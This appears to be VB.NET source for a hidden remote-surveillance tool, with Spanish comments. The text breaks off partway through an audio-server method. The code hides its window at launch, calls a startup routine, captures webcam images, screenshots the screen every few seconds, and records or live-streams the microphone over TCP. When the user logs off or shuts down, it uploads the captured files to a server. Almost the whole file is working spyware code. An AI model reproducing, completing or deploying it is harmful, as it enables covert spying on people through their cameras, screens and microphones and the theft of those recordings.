Imports System.Runtime.InteropServices
Imports System.Drawing.Imaging
Imports System.Runtime.Serialization.Formatters.Binary
Imports System.IO
Imports AForge.Video
Imports AForge.Video.DirectShow
Imports System.Net.Sockets
Imports System.Net
Imports System.Threading
Imports System.Text
'Imports AForge.Video.FFMPEG
Public Class Main
    Dim isWebCamActive As Boolean = False
    Dim isWebCamRecording As Boolean = False
    Dim isScreenRecording As Boolean = False
    Dim isMicRecording As Boolean = False
    Dim isMicStreaming As Boolean = False
    Public Sub New()
        ' Esta llamada es exigida por el diseñador.
        InitializeComponent()
        ' Agregue cualquier inicialización después de la llamada a InitializeComponent().
        VideoDevice = New FilterInfoCollection(FilterCategory.VideoInputDevice)
    End Sub
    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        CheckForIllegalCrossThreadCalls = False
        parameters = Command()
        StartUp.Init()
        ReadParameters(parameters)
        GetCameras()
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub
    Sub UploadFileToServer(ByVal filePath As String)
        Try
            If filePath.ToLower = "null" Or filePath = Nothing Then
            Else
                BoroHearSendFile(filePath)
                End
            End If
        Catch ex As Exception
            AddToLog("UploadFileToServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                AddToLog("SessionEvent", "User is logging off!", True)
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                AddToLog("SessionEvent", "System is shutting down!", True)
            Else
                AddToLog("SessionEvent", "Something happend!", True)
            End If
            If isWebCamRecording Then
                UploadFileToServer(StopCamRecord())
            End If
            If isScreenRecording Then
                UploadFileToServer(SaveScreenRecord())
            End If
            If isMicRecording Then
                UploadFileToServer(SaveMicRecord())
            End If
        Catch ex As Exception
            AddToLog("SessionEvent@Init", "Error: " & ex.Message, True)
        End Try
    End Sub

#Region "WebCam Service"
    Dim Camarita As VideoCaptureDevice
    Dim VideoDevice As FilterInfoCollection
    Dim BMP As Bitmap
    Dim picBox As New PictureBox
    Dim WebCameras As New ArrayList
    'Dim VideoWriter As New VideoFileWriter()
    Dim videoFilePath As String
    Dim usingCamera As Integer
    Function GetCameras() As String
        Try
            WebCameras.Clear()
            Dim contenido As String = Nothing
            Dim usingIndex As Integer = 0
            For Each vid As FilterInfo In VideoDevice
                Dim content As String = usingIndex & "|" & vid.Name & "|" & vid.MonikerString
                WebCameras.Add(content)
                contenido &= content & vbCrLf
                usingIndex += 1
            Next
            Return contenido
        Catch ex As Exception
            Return AddToLog("GetCameras@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Function CameraManager(Optional ByVal camIndex As SByte = 0) As String
        Try
            If Not isWebCamActive Then
                usingCamera = camIndex
                Camarita = New VideoCaptureDevice(VideoDevice(camIndex).MonikerString)
                AddHandler Camarita.NewFrame, New NewFrameEventHandler(AddressOf Capturando)
                Camarita.Start()
                isWebCamActive = True
            Else
                Try
                    Camarita.Stop()
                Catch
                End Try
                isWebCamActive = True
            End If
            Return "Camera '" & WebCameras(usingCamera).ToString.Split("|")(1) & "' (" & usingCamera & ") is now " & isWebCamActive
        Catch ex As Exception
            Return AddToLog("CameraManager@Main", "Error: " & ex.Message, True)
        End Try
    End Function
    Private Sub Capturando(sender As Object, eventArgs As NewFrameEventArgs)
        BMP = DirectCast(eventArgs.Frame.Clone(), Bitmap)
        'If isWebCamRecording Then
        '    VideoWriter.WriteVideoFrame(BMP)
        'End If
    End Sub
    Function TakeCamPicture() As String
        Try
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamPicture.png"
            Dim Imagen = BMP
            Imagen.Save(filePath, ImageFormat.Png)
            Return filePath
        Catch ex As Exception
            AddToLog("TakeCamPicture@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StartCamRecord() As String
        Try
            If Not isWebCamRecording Then
                'videoFilePath = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_CamVideo.avi"
                'VideoWriter.Open(videoFilePath, Camarita.VideoResolution.FrameSize.Width, Camarita.VideoResolution.FrameSize.Height, 25, VideoCodec.Default, 300 * 1000)
                'VideoWriter.WriteVideoFrame(BMP)
                isWebCamRecording = True
            End If
            Return "Camera " & WebCameras(usingCamera) & " (" & usingCamera & "," & isWebCamActive & ") is now recording in " & videoFilePath
        Catch ex As Exception
            AddToLog("StartCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Function StopCamRecord() As String
        Try
            If isWebCamRecording Then
                isWebCamRecording = False
                'VideoWriter.Close()
            End If
            BoroHearSendContent("Camera video record stopped! Written in " & IO.Path.GetFileName(videoFilePath))
            Return videoFilePath
        Catch ex As Exception
            AddToLog("StopCamRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region

#Region "Screen Service"
    Dim ScreenRecordmisImagenes As New ArrayList
    Dim ScreenRecordsPath As String = DIRHome & "\snapshots"
    Dim ScreenRecordThread As Threading.Thread
    Dim index As Integer = 0
    Function StartScreenRecord() As String
        Try
            If Not isScreenRecording Then
                ScreenRecordmisImagenes.Clear()
                If My.Computer.FileSystem.DirectoryExists(ScreenRecordsPath) Then
                    My.Computer.FileSystem.DeleteDirectory(ScreenRecordsPath, FileIO.DeleteDirectoryOption.DeleteAllContents)
                End If
                index = 0
                isScreenRecording = True
                ScreenRecordThread = New Threading.Thread(AddressOf ScreenRecorder)
                ScreenRecordThread.Start()
            End If
            Return 0
        Catch ex As Exception
            AddToLog("StartScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Sub StopScreenRecord()
        Try
            If isScreenRecording Then
                isScreenRecording = False
                ScreenRecordThread.Abort()
            End If
        Catch ex As Exception
            AddToLog("StopScreenRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function SaveScreenRecord() As String
        Try
            StopScreenRecord()
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_ScreenVideo.avi"
            'Elimina la ultima imagen, ya que podria estar dañada
            If My.Computer.FileSystem.FileExists(ScreenRecordsPath & "\img_" & index & ".jpg") Then
                My.Computer.FileSystem.DeleteFile(ScreenRecordsPath & "\img_" & index & ".jpg")
            End If
            For Each IMAGENes In IO.Directory.GetFiles(ScreenRecordsPath)
                Dim BM As Bitmap = Image.FromFile(IMAGENes)
                Dim BM2 As Bitmap = New Bitmap(CInt(BM.Width * 50 / 100), CInt(BM.Height * 50 / 100)) 'Tamaños
                Dim REDUCCION As Graphics = Graphics.FromImage(BM2)
                REDUCCION.DrawImage(BM, 0, 0, BM2.Width, BM2.Height)
                ScreenRecordmisImagenes.Add(BM)
            Next
            If ScreenRecordmisImagenes.Count > 0 Then
                Dim ESCRITOR As New AviWriter
                ESCRITOR.OpenAVI(filePath, 1) '1fps (mas lento)
                For Each IMAGEN In ScreenRecordmisImagenes
                    ESCRITOR.AddFrame(IMAGEN)
                Next
                ESCRITOR.AddFrame(ScreenRecordmisImagenes(ScreenRecordmisImagenes.Count - 1))
                ESCRITOR.Close()
                AddToLog("SaveScreenRecord@Main", "Video saved!", False)
                Return filePath
            Else
                AddToLog("SaveScreenRecord@Main", "No images?", False)
                Return "null"
            End If
        Catch ex As Exception
            AddToLog("SaveScreenRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
    Sub ScreenRecorder()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(ScreenRecordsPath) Then
                My.Computer.FileSystem.CreateDirectory(ScreenRecordsPath)
            End If
            While isScreenRecording
                Try
                    Dim BF As New BinaryFormatter
                    Dim IMAGEN As Bitmap
                    Dim BM As Bitmap
                    BM = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                    Dim DIBUJO As Graphics
                    DIBUJO = Graphics.FromImage(BM)
                    DIBUJO.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size)
                    DIBUJO.DrawImage(BM, 0, 0, BM.Width, BM.Height)
                    IMAGEN = New Bitmap(BM)
                    Dim DIBUJO2 As Graphics
                    DIBUJO2 = Graphics.FromImage(IMAGEN)
                    Dim MICURSOR As Cursor = Cursors.Hand
                    Dim RECTANGULO As New Rectangle(Cursor.Position.X, Cursor.Position.Y, MICURSOR.Size.Width, MICURSOR.Size.Height)
                    MICURSOR.Draw(DIBUJO2, RECTANGULO)
                    Dim MS As New MemoryStream
                    IMAGEN.Save(MS, Imaging.ImageFormat.Jpeg)
                    IMAGEN = Image.FromStream(MS)
                    IMAGEN.Save(ScreenRecordsPath & "\img_" & index & ".jpg", Imaging.ImageFormat.Jpeg)
                    index += 1
                    Threading.Thread.Sleep(5000)
                Catch ex As Exception
                    AddToLog("ScreenRecorder@Main", "Error: " & ex.Message, True)
                    Exit Sub
                End Try
            End While
        Catch ex As Exception
            AddToLog("ScreenRecorder@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
#End Region

#Region "Mic Service"
    Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String,
                                                                                   ByVal lpstrReturnString As String,
                                                                                   ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Dim micStreaming As AudioServer
    Sub StartMicRecord()
        Try
            If Not isMicRecording Then
                Dim BITS As Integer = 16
                Dim CANALES As Integer = 2
                Dim MUESTRAS As Integer = 44100
                Dim PROMEDIO As Integer = BITS * CANALES * MUESTRAS / 8
                Dim ALINEACION As Integer = BITS * CANALES / 8
                Dim COMANDO As String
                COMANDO = "set capture bitspersample " & BITS & " channels " & CANALES & " alignment " & ALINEACION & " samplespersec " &
                MUESTRAS & " bytespersec " & PROMEDIO & " format tag pcm wait"
                mciSendString("close capture", "", 0, 0)
                mciSendString("open new type waveaudio alias capture", "", 0, 0)
                mciSendString(COMANDO, "", 0, 0)
                mciSendString("record capture", "", 0, 0)
                isMicRecording = True
            End If
        Catch ex As Exception
            AddToLog("StartMicRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StartMicStreaming(ByVal port As Integer)
        Try
            If Not isMicStreaming Then
                micStreaming = New AudioServer
                Dim threadmicStreaming = New Thread(Sub() micStreaming.Starter(port))
                threadmicStreaming.Start()
                isMicStreaming = True
            Else
                AddToLog("StartMicStreaming@Main", "Already streaming mic audio!", False)
            End If
        Catch ex As Exception
            AddToLog("StartMicStreaming@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopMicRecord(Optional ByVal close As Boolean = False)
        Try
            If Not close Then
                mciSendString("stop capture", "", 0, 0)
            Else
                mciSendString("close capture", "", 0, 0)
            End If
        Catch ex As Exception
            AddToLog("StopMicRecord@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub StopMicStreaming()
        Try
            If isMicStreaming Then
                micStreaming.Stopper()
            Else
                AddToLog("StopMicStreaming@Main", "No mic audio streaming to close", False)
            End If
        Catch ex As Exception
            AddToLog("StopMicStreaming@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Function SaveMicRecord() As String
        Try
            StopMicRecord()
            Dim filePath As String = DIRHome & "\usr" & UID & "_" & DateTime.Now.ToString("hhmmssddMMyyyy") & "_MicRecord.wav"
            mciSendString("save capture " & filePath, "", 0, 0)
            StopMicRecord(True)
            Return filePath
        Catch ex As Exception
            AddToLog("SaveMicRecord@Main", "Error: " & ex.Message, True)
            Return "null"
        End Try
    End Function
#End Region
End Class
#Region "Screenrecord"
Public Class Avi
    Public Const StreamtypeVIDEO As Integer = 1935960438
    Public Const OF_SHARE_DENY_WRITE As Integer = 32
    Public Const BMP_MAGIC_COOKIE As Integer = 19778
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure RECTstruc
        Public left As UInt32
        Public top As UInt32
        Public right As UInt32
        Public bottom As UInt32
    End Structure
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure BITMAPINFOHEADERstruc
        Public biSize As UInt32
        Public biWidth As Int32
        Public biHeight As Int32
        Public biPlanes As Int16
        Public biBitCount As Int16
        Public biCompression As UInt32
        Public biSizeImage As UInt32
        Public biXPelsPerMeter As Int32
        Public biYPelsPerMeter As Int32
        Public biClrUsed As UInt32
        Public biClrImportant As UInt32
    End Structure
    <StructLayout(LayoutKind.Sequential, Pack:=1)>
    Public Structure AVISTREAMINFOstruc
        Public fccType As UInt32
        Public fccHandler As UInt32
        Public dwFlags As UInt32
        Public dwCaps As UInt32
        Public wPriority As UInt16
        Public wLanguage As UInt16
        Public dwScale As UInt32
        Public dwRate As UInt32
        Public dwStart As UInt32
        Public dwLength As UInt32
        Public dwInitialFrames As UInt32
        Public dwSuggestedBufferSize As UInt32
        Public dwQuality As UInt32
        Public dwSampleSize As UInt32
        Public rcFrame As RECTstruc
        Public dwEditCount As UInt32
        Public dwFormatChangeCount As UInt32
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=64)>
        Public szName As UInt16()
    End Structure
    'Initialize the AVI library
    <DllImport("avifil32.dll")>
    Public Shared Sub AVIFileInit()
    End Sub
    'Open an AVI file
    <DllImport("avifil32.dll", PreserveSig:=True)>
    Public Shared Function AVIFileOpen(ByRef ppfile As Integer, ByVal szFile As [String], ByVal uMode As Integer, ByVal pclsidHandler As Integer) As Integer
    End Function
    'Create a new stream in an open AVI file
    <DllImport("avifil32.dll")>
    Public Shared Function AVIFileCreateStream(ByVal pfile As Integer, ByRef ppavi As IntPtr, ByRef ptr_streaminfo As AVISTREAMINFOstruc) As Integer
    End Function
    'Set the format for a new stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamSetFormat(ByVal aviStream As IntPtr, ByVal lPos As Int32, ByRef lpFormat As BITMAPINFOHEADERstruc, ByVal cbFormat As Int32) As Integer
    End Function
    'Write a sample to a stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamWrite(ByVal aviStream As IntPtr, ByVal lStart As Int32, ByVal lSamples As Int32, ByVal lpBuffer As IntPtr, ByVal cbBuffer As Int32, ByVal dwFlags As Int32,
         ByVal dummy1 As Int32, ByVal dummy2 As Int32) As Integer
    End Function
    'Release an open AVI stream
    <DllImport("avifil32.dll")>
    Public Shared Function AVIStreamRelease(ByVal aviStream As IntPtr) As Integer
    End Function
    'Release an open AVI file
    <DllImport("avifil32.dll")>
    Public Shared Function AVIFileRelease(ByVal pfile As Integer) As Integer
    End Function
    'Close the AVI library
    <DllImport("avifil32.dll")>
    Public Shared Sub AVIFileExit()
    End Sub
End Class
Public Class AviWriter
    Private aviFile As Integer = 0
    Private aviStream As IntPtr = IntPtr.Zero
    Private frameRate As UInt32 = 0
    Private countFrames As Integer = 0
    Private width As Integer = 0
    Private height As Integer = 0
    Private stride As UInt32 = 0
    Private fccType As UInt32 = Avi.StreamtypeVIDEO
    Private fccHandler As UInt32 = 1668707181
    Private strideInt As Integer
    Private strideU As UInteger
    Private heightU As UInteger
    Private widthU As UInteger
    Public Sub OpenAVI(ByVal fileName As String, ByVal frameRate As UInt32)
        Me.frameRate = frameRate

        Avi.AVIFileInit()


        Dim OpeningError As Integer = Avi.AVIFileOpen(aviFile, fileName, 4097, 0)
        If OpeningError <> 0 Then
            Throw New Exception("Error in AVIFileOpen: " + OpeningError.ToString())
        End If


    End Sub
    Public Sub AddFrame(ByVal bmp As Bitmap)

        bmp.RotateFlip(RotateFlipType.RotateNoneFlipY)

        Dim bmpData As BitmapData = bmp.LockBits(New Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.[ReadOnly], PixelFormat.Format24bppRgb)
        If countFrames = 0 Then
            Dim bmpDatStride As UInteger = bmpData.Stride
            Me.stride = bmpDatStride
            Me.width = bmp.Width
            Me.height = bmp.Height
            CreateStream()
        End If
        strideInt = stride

        Dim writeResult As Integer = Avi.AVIStreamWrite(aviStream, countFrames, 1, bmpData.Scan0, strideInt * height, 0, 0, 0)
        If writeResult <> 0 Then
            Throw New Exception("Error in AVIStreamWrite: " + writeResult.ToString())
        End If

        bmp.UnlockBits(bmpData)
        System.Math.Max(System.Threading.Interlocked.Increment(countFrames), countFrames - 1)
    End Sub
    Private Sub CreateStream()
        Dim strhdr As New Avi.AVISTREAMINFOstruc()
        strhdr.fccType = fccType
        strhdr.fccHandler = fccHandler
        strhdr.dwScale = 1
        strhdr.dwRate = frameRate
        strideU = stride
        heightU = height
        strhdr.dwSuggestedBufferSize = stride * strideU
        strhdr.dwQuality = 10000

        heightU = height
        widthU = width
        strhdr.rcFrame.bottom = heightU
        strhdr.rcFrame.right = widthU
        strhdr.szName = New UInt16(64) {}

        Dim createResult As Integer = Avi.AVIFileCreateStream(aviFile, aviStream, strhdr)
        If createResult <> 0 Then
            Throw New Exception("Error in AVIFileCreateStream: " + createResult.ToString())
        End If
        Dim bi As New Avi.BITMAPINFOHEADERstruc()
        Dim bisize As UInteger = Marshal.SizeOf(bi)
        bi.biSize = bisize
        bi.biWidth = width
        bi.biHeight = height
        bi.biPlanes = 1
        bi.biBitCount = 24

        strideU = stride
        heightU = height
        bi.biSizeImage = strideU * heightU
        Dim formatResult As Integer = Avi.AVIStreamSetFormat(aviStream, 0, bi, Marshal.SizeOf(bi))
        If formatResult <> 0 Then
            Throw New Exception("Error in AVIStreamSetFormat: " + formatResult.ToString())
        End If
    End Sub
    Public Sub Close()
        If aviStream <> IntPtr.Zero Then
            Avi.AVIStreamRelease(aviStream)
            aviStream = IntPtr.Zero
        End If
        If aviFile <> 0 Then
            Avi.AVIFileRelease(aviFile)
            aviFile = 0
        End If
        Avi.AVIFileExit()
    End Sub
End Class
#End Region
#Region "SoundTCP"
Public Class AudioServer
    Dim m_Client As TcpClient
    Dim m_Server As TCPServer
    Dim PRIVADA As String
    Dim PUERTO As Integer
    Dim m_SoundBufferCount As Integer = 8
    Dim m_PrototolClient As New WinSound.Protocol(WinSound.ProtocolTypes.LH, Encoding.[Default])
    Dim m_DictionaryServerDatas As New Dictionary(Of ServerThread, ServerThreadData)()
    Dim m_Recorder_Client As WinSound.Recorder
    Dim m_Recorder_Server As WinSound.Recorder
    Dim m_PlayerClient As WinSound.Player
    Dim m_RecorderFactor As UInteger = 4
    Dim m_JitterBufferClientRecording As WinSound.JitterBuffer
    Dim m_JitterBufferClientPlaying As WinSound.JitterBuffer
    Dim m_JitterBufferServerRecording As WinSound.JitterBuffer
    Dim m_FileHeader As New WinSound.WaveFileHeader()
    Dim m_IsFormMain As Boolean = True
    Dim m_SequenceNumber As Long = 4596
    Dim m_TimeStamp As Long = 0
    Dim m_Version As Integer = 2
    Dim m_Padding As Boolean = False
    Dim m_Extension As Boolean = False
    Dim m_CSRCCount As Integer = 0
    Dim m_Marker As Boolean = False
    Dim m_PayloadType As Integer = 0
    Dim m_SourceId As UInteger = 0
    Dim m_TimerProgressBarFile As New System.Windows.Forms.Timer()
    Dim m_TimerProgressBarPlayingClient As New System.Windows.Forms.Timer()
    Dim m_TimerMixed As WinSound.EventTimer = Nothing
    Dim m_FilePayloadBuffer As [Byte]()
    Dim m_RTPPartsLength As Integer = 0
    Dim m_Milliseconds As UInteger = 20
    Dim m_TimerDrawProgressBar As System.Windows.Forms.Timer
    Dim LockerDictionary As New [Object]()
    Public Shared DictionaryMixed As Dictionary(Of [Object], Queue(Of List(Of [Byte]))) = New Dictionary(Of [Object], Queue(Of List(Of Byte)))()
    Dim m_Encoding As Encoding = Encoding.GetEncoding(1252)
    Dim RecordingJitterBufferCount As Integer = 8
    Dim JitterBufferCountServer As UInteger = 20
    Dim SamplesPerSecondServer As Integer = 8000
    Dim BitsPerSampleServer As Integer = 16
    Dim ChannelsServer As Integer = 1
    Dim UseJitterBufferServerRecording As Boolean = True
    Dim ServerNoSpeakAll As Boolean = False
    Public Sub Starter(ByVal port As Integer)
        Try
            Try
                Dim MIHOST As String = My.Computer.Name
                Dim MIIP As IPHostEntry = Dns.GetHostEntry(MIHOST)
                For Each DIRECCION As IPAddress In Dns.GetHostEntry(MIHOST).AddressList
                    If DIRECCION.ToString.StartsWith("192.") Or DIRECCION.ToString.StartsWith("172.") Or DIRECCION.ToString.StartsWith("169.") Or
                        DIRECCION.ToString.StartsWith("10.") Then
                        PRIVADA = DIRECCION.ToString
                        Exit For
                    End If
                Next
                PUERTO = port
                Try
                    InitJitterBufferServerRecording()
                Catch ex As Exception
                    AddToLog("Starter(0)@Main", "Error: " & ex.Message, True)
                End Try
                Try
                    If IsServerRunning Then
                        StopServer()
                        StopRecordingFromSounddevice_Server()
                        StopTimerMixed()
                    Else
                        StartServer()
                        If ServerNoSpeakAll = False Then
                            StartRecordingFromSounddevice_Server()
                        End If
                        StartTimerMixed()
                    End If
                Catch ex As Exception
                    AddToLog("Starter(1)@Main", "Error: " & ex.Message, True)
                End Try
            Catch ex As Exception
                AddToLog("Starter(2)@Main", "Error: " & ex.Message, True)
            End Try
        Catch ex As Exception
            AddToLog("Starter(3)@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Public Sub Stopper()
        Try
            m_IsFormMain = False
            StopRecordingFromSounddevice_Server()
            StopServer()
        Catch ex As Exception
            AddToLog("Stopper@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub FillRTPBufferWithPayloadData(ByVal header As WinSound.WaveFileHeader)
        m_RTPPartsLength = WinSound.Utils.GetBytesPerInterval(header.SamplesPerSecond, header.BitsPerSample, header.Channels)
        m_FilePayloadBuffer = header.Payload
    End Sub
    Private Sub OnTimerSendMixedDataToAllClients()
        Try
            Dim dic As Dictionary(Of [Object], List(Of [Byte])) = New Dictionary(Of Object, List(Of Byte))()
            Dim listlist As New List(Of List(Of Byte))()
            Dim copy As Dictionary(Of [Object], Queue(Of List(Of [Byte]))) = New Dictionary(Of Object, Queue(Of List(Of Byte)))(DictionaryMixed)
            If True Then
                Dim q As Queue(Of List(Of Byte)) = Nothing
                For Each obj As [Object] In copy.Keys
                    q = copy(obj)
                    If q.Count > 0 Then
                        dic(obj) = q.Dequeue()
                        listlist.Add(dic(obj))
                    End If
                Next
            End If
            If listlist.Count > 0 Then
                Dim mixedBytes As [Byte]() = WinSound.Mixer.MixBytes(listlist, BitsPerSampleServer).ToArray()
                Dim listMixed As New List(Of [Byte])(mixedBytes)
                For Each client As ServerThread In m_Server.Clients
                    If client.IsMute = False Then
                        Dim mixedBytesClient As [Byte]() = mixedBytes
                        If dic.ContainsKey(client) Then
                            Dim listClient As List(Of [Byte]) = dic(client)
                            mixedBytesClient = WinSound.Mixer.SubsctractBytes_16Bit(listMixed, listClient).ToArray()
                        End If
                        Dim rtp As WinSound.RTPPacket = ToRTPPacket(mixedBytesClient, BitsPerSampleServer, ChannelsServer)
                        Dim rtpBytes As [Byte]() = rtp.ToBytes()
                        client.Send(m_PrototolClient.ToBytes(rtpBytes))
                    End If
                Next
            End If
        Catch ex As Exception
            m_TimerProgressBarPlayingClient.[Stop]()
            AddToLog("OnTimerSendMixedDataToAllClients@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub InitJitterBufferServerRecording()
        If m_JitterBufferServerRecording IsNot Nothing Then
            RemoveHandler m_JitterBufferServerRecording.DataAvailable, AddressOf OnJitterBufferServerDataAvailable
        End If
        m_JitterBufferServerRecording = New WinSound.JitterBuffer(Nothing, RecordingJitterBufferCount, 20)
        AddHandler m_JitterBufferServerRecording.DataAvailable, AddressOf OnJitterBufferServerDataAvailable
    End Sub
    Private ReadOnly Property UseJitterBufferServer() As Boolean
        Get
            Return JitterBufferCountServer >= 2
        End Get
    End Property
    Private Sub StartRecordingFromSounddevice_Server()
        Try
            If IsRecorderFromSounddeviceStarted_Server = False Then
                Dim bufferSize As Integer = 0
                If UseJitterBufferServerRecording Then
                    bufferSize = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer) * CInt(m_RecorderFactor)
                Else
                    bufferSize = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer)
                End If
                If bufferSize > 0 Then
                    m_Recorder_Server = New WinSound.Recorder()
                    AddHandler m_Recorder_Server.DataRecorded, AddressOf OnDataReceivedFromSoundcard_Server
                    If m_Recorder_Server.Start(Nothing, SamplesPerSecondServer, BitsPerSampleServer, ChannelsServer, m_SoundBufferCount, bufferSize) Then
                        DictionaryMixed(Me) = New Queue(Of List(Of Byte))()
                        m_JitterBufferServerRecording.Start()
                    End If
                End If
            End If
        Catch ex As Exception
            AddToLog("StartRecordingFromSounddevice_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StopRecordingFromSounddevice_Server()
        Try
            If IsRecorderFromSounddeviceStarted_Server Then
                m_Recorder_Server.[Stop]()
                RemoveHandler m_Recorder_Server.DataRecorded, AddressOf OnDataReceivedFromSoundcard_Server
                m_Recorder_Server = Nothing
                m_JitterBufferServerRecording.[Stop]()
            End If
        Catch ex As Exception
            AddToLog("StopRecordingFromSounddevice_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnDataReceivedFromSoundcard_Server(ByVal data As [Byte]())
        Try
            SyncLock Me
                If IsServerRunning Then
                    If m_IsFormMain Then
                        If ServerNoSpeakAll = False Then
                            Dim bytesPerInterval As Integer = WinSound.Utils.GetBytesPerInterval(CUInt(SamplesPerSecondServer), BitsPerSampleServer, ChannelsServer)
                            Dim count As Integer = data.Length / bytesPerInterval
                            Dim currentPos As Integer = 0
                            For i As Integer = 0 To count - 1
                                Dim partBytes As [Byte]() = New [Byte](bytesPerInterval - 1) {}
                                Array.Copy(data, currentPos, partBytes, 0, bytesPerInterval)
                                currentPos += bytesPerInterval
                                Dim q As Queue(Of List(Of [Byte])) = DictionaryMixed(Me)
                                If q.Count < 10 Then
                                    q.Enqueue(New List(Of [Byte])(partBytes))
                                End If
                            Next
                        End If
                    End If
                End If
            End SyncLock
        Catch ex As Exception
            AddToLog("OnDataReceivedFromSoundcard_Server@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnJitterBufferServerDataAvailable(ByVal sender As [Object], ByVal rtp As WinSound.RTPPacket)
        Try
            If IsServerRunning Then
                If m_IsFormMain Then
                    Dim rtpBytes As [Byte]() = rtp.ToBytes()
                    Dim list As New List(Of ServerThread)(m_Server.Clients)
                    For Each client As ServerThread In list
                        If client.IsMute = False Then
                            Try
                                client.Send(m_PrototolClient.ToBytes(rtpBytes))
                            Catch generatedExceptionName As Exception
                            End Try
                        End If
                    Next
                End If
            End If
        Catch ex As Exception
            Dim sf As New System.Diagnostics.StackFrame(True)
            AddToLog("OnJitterBufferServerDataAvailable@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Function ToRTPData(ByVal data As [Byte](), ByVal bitsPerSample As Integer, ByVal channels As Integer) As [Byte]()
        Dim rtp As WinSound.RTPPacket = ToRTPPacket(data, bitsPerSample, channels)
        Dim rtpBytes As [Byte]() = rtp.ToBytes()
        Return rtpBytes
    End Function
    Private Function ToRTPPacket(ByVal linearData As [Byte](), ByVal bitsPerSample As Integer, ByVal channels As Integer) As WinSound.RTPPacket
        Dim mulaws As [Byte]() = WinSound.Utils.LinearToMulaw(linearData, bitsPerSample, channels)
        Dim rtp As New WinSound.RTPPacket()
        rtp.Data = mulaws
        rtp.CSRCCount = m_CSRCCount
        rtp.Extension = m_Extension
        rtp.HeaderLength = WinSound.RTPPacket.MinHeaderLength
        rtp.Marker = m_Marker
        rtp.Padding = m_Padding
        rtp.PayloadType = m_PayloadType
        rtp.Version = m_Version
        rtp.SourceId = m_SourceId
        Try
            rtp.SequenceNumber = Convert.ToUInt16(m_SequenceNumber)
            m_SequenceNumber += 1
        Catch generatedExceptionName As Exception
            m_SequenceNumber = 0
        End Try
        Try
            rtp.Timestamp = Convert.ToUInt32(m_TimeStamp)
            m_TimeStamp += mulaws.Length
        Catch generatedExceptionName As Exception
            m_TimeStamp = 0
        End Try
        Return rtp
    End Function
    Private ReadOnly Property IsRecorderFromSounddeviceStarted_Server() As Boolean
        Get
            If m_Recorder_Server IsNot Nothing Then
                Return m_Recorder_Server.Started
            End If
            Return False
        End Get
    End Property
    Private Sub StartServer()
        Try
            If IsServerRunning = False Then
                If PRIVADA.Length > 0 AndAlso PUERTO > 0 Then
                    m_Server = New TCPServer()
                    AddHandler m_Server.ClientConnected, AddressOf OnServerClientConnected
                    AddHandler m_Server.ClientDisconnected, AddressOf OnServerClientDisconnected
                    AddHandler m_Server.DataReceived, AddressOf OnServerDataReceived
                    m_Server.Start(PRIVADA, PUERTO)
                End If
            End If
        Catch ex As Exception
            AddToLog("StartServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub StopServer()
        Try
            If IsServerRunning = True Then
                DeleteAllServerThreadDatas()
                m_Server.[Stop]()
                RemoveHandler m_Server.ClientConnected, AddressOf OnServerClientConnected
                RemoveHandler m_Server.ClientDisconnected, AddressOf OnServerClientDisconnected
                RemoveHandler m_Server.DataReceived, AddressOf OnServerDataReceived
            End If
            m_Server = Nothing
        Catch ex As Exception
            AddToLog("StopServer@Main", "Error: " & ex.Message, True)
        End Try
    End Sub
    Private Sub OnServerClientConnected(ByVal st As ServerThread)
        Try
            Dim data As New ServerThreadData()
            data.Init(st, Nothing, SamplesPerSecondServer, BitsPerSampleServer, ChannelsServer, m_SoundBufferCount,
            JitterBufferCountServer, m_Milliseconds)
            m_DictionaryServerDatas(st) = data
            SendConfigurationToClient(data)
        Catch ex As Exception
